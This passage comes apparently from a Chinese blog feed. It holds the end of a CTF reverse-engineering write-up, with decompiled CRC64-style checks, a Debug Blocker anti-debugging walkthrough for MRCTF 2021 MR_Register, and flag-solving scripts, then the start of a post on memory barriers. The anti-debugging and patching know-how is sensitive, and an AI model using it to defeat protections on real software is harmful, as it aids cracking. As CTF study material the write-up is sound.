class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v16 <span class="token operator">=</span> <span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">*</span>v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v17 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v18 <span class="token operator">=</span> j<span class="token punctuation">;</span>    v19 <span class="token operator">=</span> j <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&gt;=</span> <span class="token number">6</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v20 <span class="token operator">=</span> s<span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v21 <span class="token operator">=</span> k<span class="token punctuation">;</span>      v22 <span class="token operator">=</span> k <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> k <span class="token operator">&gt;=</span> <span class="token number">64</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      v23 <span class="token operator">=</span> v4<span class="token punctuation">;</span>      v24 <span class="token operator">=</span> v4 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v27 <span class="token operator">=</span> v4<span class="token punctuation">;</span>        v28 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">;</span>        v4 <span class="token operator">*=</span> <span class="token number">2LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        v25 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">;</span>        v26 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">;</span>        v4 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> v4 <span class="token operator">^</span> <span class="token number">0xB0004B7679FA26B3LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      v29 <span class="token operator">=</span> k<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v30 <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> j<span class="token punctuation">;</span>    v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v31 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    v32 <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v33 <span class="token operator">=</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_402170<span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> v33 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v33 <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v10<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过观察可以，实际上这部分代码使用的是CRC32的查表法，对数据进行加密。</p><p>加密原理实际上就是CRC32算法:</p><blockquote><p>输入一组长度48的字符串，每8个字节分为1组，共6组。对每一组取首位，判断正负。正值，左移一位；负值，左移一位，再异或0xB0004B7679FA26B3。重复判断操作64次，得到查表法所用的表。</p></blockquote><p>因此我们只需要将整个加密过程逆向操作得到查表法的表</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">0x6666367b67616c66</span><span class="token number">0x63362d3039333932</span><span class="token number">0x2d363563342d3032</span><span class="token number">0x3539612d30376162</span><span class="token number">0x6631643365383537</span><span class="token number">0x7d38</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再进行CRC64计算，就能得到flag</p><p>解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xBC8FF26D43536296</span><span class="token punctuation">,</span> <span class="token number">0x520100780530EE16</span><span class="token punctuation">,</span> <span class="token number">0x4DC0B5EA935F08EC</span><span class="token punctuation">,</span>          <span class="token number">0x342B90AFD853F450</span><span class="token punctuation">,</span> <span class="token number">0x8B250EBCAA2C3681</span><span class="token punctuation">,</span> <span class="token number">0x55759F81A2C68AE4</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token number">0xB0004B7679FA26B3</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># 产生CRC32查表法所用的表</span><span class="token keyword">for</span> s <span class="token keyword">in</span> secret<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sign <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token number">1</span>        <span class="token comment"># 判断是否为负</span>        <span class="token keyword">if</span> sign <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            s <span class="token operator">^</span><span class="token operator">=</span> key        s <span class="token operator">//=</span> <span class="token number">2</span>        <span class="token comment"># 防止负值除2，溢出为正值</span>        <span class="token keyword">if</span> sign <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            s <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x8000000000000000</span>    <span class="token comment"># 输出表</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 计算CRC64</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> j <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>s<span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token punctuation">)</span>        s <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">8</span>        j <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="x02-debug-blocker">0x02 Debug Blocker</h1><p>DebugBlocker技术，顾名思义，是通过进程以调试模式运行自身或者其他可执行文件，使得我们难以动态调试。（在Windows中，一个进程无法被多个调试器进行调试，所以如果关键算法代码运行于被调试的子进程中，因为子进程与父进程之间构成调试者与被调试者的关系，就自然的形成了反调试作用）这是一种比较繁琐的反调试技术，常常应用在一些PE保护器中</p><h3 id="debug-blocker反调试特征">debug blocker反调试特征</h3><p><strong>父与子的关系</strong></p><blockquote><p>调试器与被调试器关系中，调试进程与被调试进程首先是一种父子关系。</p></blockquote><p><strong>被调试进程不能在被其他调试器调试</strong></p><blockquote><p>Windows操作系统中，同一进程是无法同时被多个调试进程调试的，若想调试被调试进程，必须先切断原调试器与被调试者的关系。</p></blockquote><p><strong>终止调试进程的同时也终止被调试进程</strong></p><blockquote><p>强制终止调试进程以切断调试器-被调试器关系时，被调试进程也会同时终止。</p></blockquote><p><strong>调试器操作被调试者的代码</strong></p><blockquote><p>DebugBlocker技术中，调试器用来操作被调试进程的运行分支，生成或修改执行代码等，并且，调试器会对被调试进程的代码运行情况产生持续影响，缺少调试进程的前提下，仅凭被调试进程无法正常运行。</p></blockquote><p><strong>调试器处理被调试进程中发生的异常</strong></p><blockquote><p>调试者-被调试者关系中，被调试进程中发生的所有异常均有调试器处理。</p></blockquote><p><strong>被调试进程中故意触发某个异常时，若该异常未得到处理，则代码将无法继续运行。</strong></p><blockquote><p>被调试进程中发生异常时，进程会暂停，控制权转移到调试器，此时调试器可以修改被调试者的执行分支，此外也可以对被调试进程内部的加密代码解码，或者向寄存器、栈中存入某些特定值等。</p></blockquote><h3 id="debugblocker实战2021mrctfmr_register">debugBlocker实战|[2021MRCTF]MR_Register</h3><p>破译debugBlocker保护程序的关键在<strong>子进程</strong>。分析方法很多，但绝大多数，只要找到debugblocker核心代码，静态分析和动调父进程看子进程反馈就好了。</p><p>跟进start函数，main函数一般在该语句后面一句被调用</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d1f618e1d3baa716cdf8461edc47abb16f2e275d.png" alt="image-20220415172429803"><figcaption aria-hidden="true">image-20220415172429803</figcaption></figure><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token constant">_QWORD</span> <span class="token operator">*</span><span class="token punctuation">)</span>Buffer <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  PipeAttributes<span class="token operator">.</span>bInheritHandle <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  PipeAttributes<span class="token operator">.</span>lpSecurityDescriptor <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  PipeAttributes<span class="token operator">.</span>nLength <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">IsDebuggerPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sub_4026EA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">GetModuleFileNameA</span><span class="token punctuation">(</span><span class="token number">0</span>i64<span class="token punctuation">,</span> Filename<span class="token punctuation">,</span> <span class="token number">0</span>xC8u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CreatePipe</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hWritePipe<span class="token punctuation">,</span> <span class="token operator">&amp;</span>PipeAttributes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token string double-quoted-string">"%x"</span><span class="token punctuation">,</span> hWritePipe<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">SetEnvironmentVariableA</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hWrite"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span><span class="token number">0</span>i64<span class="token punctuation">,</span> Filename<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span>u<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>StartupInfo<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token constant">LPPROCESS_INFORMATION</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>hProcess<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v4 <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">exit</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">GetStartupInfoA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StartupInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40188D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hProcess <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实这里的ifelse语句就区别了父进程与子进程执行不同的语句，因为创建出的子进程是调试模式运行的。这里关注一下创建进程的<strong>dwCreationFlags</strong>参数</p><p>接下来继续分析后面父进程处理子进程异常的部分也就是sub_40188D()函数关键是看DebugEvent.dwDebugEventCode== 1的活动：接受处理来自子进程的异常，进而修改子进程代码。</p><p>参考大佬博客,找到了子进程异常的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">第一次交互：通过除<span class="token number">0</span>异常触发<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">374</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>    Buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> Buffer<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">;</span>             <span class="token comment">// 对表进行了一个简单异或运算。</span>  Buffer<span class="token punctuation">[</span><span class="token number">375</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">120</span><span class="token punctuation">;</span>        rip <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>第二次交互：通过int3交互，解密代码。地址：<span class="token number">0x0000401E1C</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0x57D</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">_BYTE</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^=</span> i<span class="token punctuation">;</span>        rip <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>第三次，在patch后的代码第一次遇到int3<span class="token punctuation">,</span>触发异常交互：        rip <span class="token operator">+=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用idapython patch文件，nop掉无用的代码</p><p>修改后我们得到关键函数</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://shs3.b.qianxin.com/attack_forum/2022/04/attach-592279661fbf2057ce40141ccfe303b1fc88641c.png" alt="image-20220415180010549"><figcaption aria-hidden="true">image-20220415180010549</figcaption></figure><p>发现加密逻辑非常简单，逆向反写就可以得出flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#include &lt;stdio.h&gt;</span>unsigned <span class="token keyword type-declaration">int</span> enc<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">{</span>  <span class="token number">0x4d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0xe2</span><span class="token punctuation">,</span> <span class="token number">0x188</span><span class="token punctuation">,</span> <span class="token number">0x2b0</span><span class="token punctuation">,</span> <span class="token number">0x4b3</span><span class="token punctuation">,</span> <span class="token number">0x7a6</span><span class="token punctuation">,</span> <span class="token number">0xc8d</span><span class="token punctuation">,</span> <span class="token number">0x14a1</span><span class="token punctuation">,</span> <span class="token number">0x218d</span><span class="token punctuation">,</span> <span class="token number">0x36a7</span><span class="token punctuation">,</span> <span class="token number">0x5864</span><span class="token punctuation">,</span> <span class="token number">0x8f80</span><span class="token punctuation">,</span> <span class="token number">0xe843</span><span class="token punctuation">,</span> <span class="token number">0x17827</span><span class="token punctuation">,</span> <span class="token number">0x2609d</span><span class="token punctuation">,</span> <span class="token number">0x3d926</span><span class="token punctuation">,</span> <span class="token number">0x63a38</span><span class="token punctuation">,</span> <span class="token number">0xa13c5</span><span class="token punctuation">,</span> <span class="token number">0x104e5c</span><span class="token punctuation">,</span> <span class="token number">0x1a6252</span><span class="token punctuation">,</span> <span class="token number">0x2ab122</span><span class="token punctuation">,</span> <span class="token number">0x4513b3</span><span class="token punctuation">,</span> <span class="token number">0x6fc534</span><span class="token punctuation">,</span> <span class="token number">0xb4d955</span><span class="token punctuation">,</span> <span class="token number">0x1249eb9</span><span class="token punctuation">,</span> <span class="token number">0x1d9786d</span><span class="token punctuation">,</span> <span class="token number">0x2fe179d</span><span class="token punctuation">,</span> <span class="token number">0x4d7906b</span><span class="token punctuation">,</span> <span class="token number">0x7d5a841</span><span class="token punctuation">,</span> <span class="token number">0xcad38cd</span><span class="token punctuation">,</span> <span class="token number">0x1482e18b</span><span class="token punctuation">}</span><span class="token punctuation">;</span>char flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword type-declaration">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword type-declaration">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword type-declaration">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword type-declaration">int</span> init <span class="token operator">=</span> enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>enc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> enc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>enc<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>enc<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token function">putchar</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="x03-后记">0x03 后记</h1><p>正如本文标题，浅浅学习了一波两种小众混淆技术。该部分内容难度较大，考察程序逆向的熟练性，路漫漫其修远兮，吾将上下而求索。</p><h1 id="x04-参考链接">0x04 参考链接</h1><p>https://blog.csdn.net/szxpck/article/details/107347638</p><p>https://zhuanlan.zhihu.com/p/345843635</p><p>https://security.tencent.com/index.php/blog/msg/112</p><p>https://www.52pojie.cn/thread-1417678-1-1.html</p><p>https://bbs.pediy.com/thread-267013.htm#msg_header_h3_2</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内存屏障与内存排序</title>
      <link href="/2023/01/19/nei-cun-ping-zhang-yu-nei-cun-pai-xu/"/>
      <url>/2023/01/19/nei-cun-ping-zhang-yu-nei-cun-pai-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="引言">引言</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">Thread0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ARR_LEN<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">Thread1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ARR_LEN<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">Thread2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ARR_LEN<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设想一下，如果依次执行这三个线程，答案必然是形如<code>0 1 2 3 4 5 ...</code>的一串数字。但是在程序运行中，却有概率得到如 <code>0 0 0 0 0 ...</code>全为 0 的结果。模糊的说，这是由于编译器优化与 CPU乱序执行导致的。为了解决这个问题，我们引入了内存屏障。</p><h2 id="内存屏障">内存屏障</h2><blockquote><p><a href="https://zh.wikipedia.org/wiki/内存屏障/">内存屏障 -Wikipedia</a></p></blockquote><p>内存乱序指的是内存操作出现乱序，CPU缓存、编译器优化、处理器指令优化等都会改变内存顺序，造成内存乱序。</p><p>学习内存顺序容易陷入了一个误区，因为内存顺序是和CPU架构、编译器息息相关的，想要去深入理解CPU缓存怎么导致内存乱序的，编译器优化和处理器指令又是怎么导致内存乱序的，很容易陷入一个又一个填不了的坑。要去了解各种编译器优化技术、了解各种CPU的指令集，甚至连ARM的v7和v8区别都去看了一下。</p><p>鲁迅说过，学海无涯，回头是岸。内存顺序或者说内存模型其实是语言层面的东西，所以可以直接从语言层面去理解，所谓内存乱序，在语言层面的表现就是虽然你写了A、B、C三行代码，但是最后在线程中执行顺序可能是CBA，而另外一个线程，观察该线程得到的执行顺序可能是ACB。这些是由于CPU缓存、编译器优化、处理器指令优化等共同造成的。</p><p>上述各种优化导致的内存乱序并不是随意地乱序，是有底线的，这个底线就是单线程场景下，优化后程序的执行结果要和优化前保持一致，即让写代码的人感觉是没有优化存在的，代码就是按照他写的顺序执行的。</p><p>现代CPU基本上都支持流水线（pipeline）上的指令重排，且编译器也会把一些代码在编译期重排，已减少对内存的访问和一些无效的计算，这就意味着我们的代码在真正的载入内存和执行的时候可能和我们写下它的时候长的不太一样。</p><p>内存排序是指CPU访问主存时的顺序。可以是编译器在编译时产生，也可以是CPU在运行时产生。反映了内存操作重排序，乱序执行，从而充分利用不同内存的总线带宽。</p><p>现代处理器大都是乱序执行。因此需要内存屏障以确保多线程的同步。</p><h2 id="x86-linux-中的内存屏障">x86 Linux 中的内存屏障</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_X86_32</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">mb</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token function">ALTERNATIVE</span><span class="token punctuation">(</span></span><span class="token string">"lock; addl $0,-4(%%esp)"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">"mfence"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token punctuation">\</span>      <span class="token expression">X86_FEATURE_XMM2<span class="token punctuation">)</span> <span class="token operator">::</span><span class="token operator">:</span> </span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">"cc"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">rmb</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token function">ALTERNATIVE</span><span class="token punctuation">(</span></span><span class="token string">"lock; addl $0,-4(%%esp)"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">"lfence"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token punctuation">\</span>       <span class="token expression">X86_FEATURE_XMM2<span class="token punctuation">)</span> <span class="token operator">::</span><span class="token operator">:</span> </span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">"cc"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">wmb</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">asm</span> <span class="token 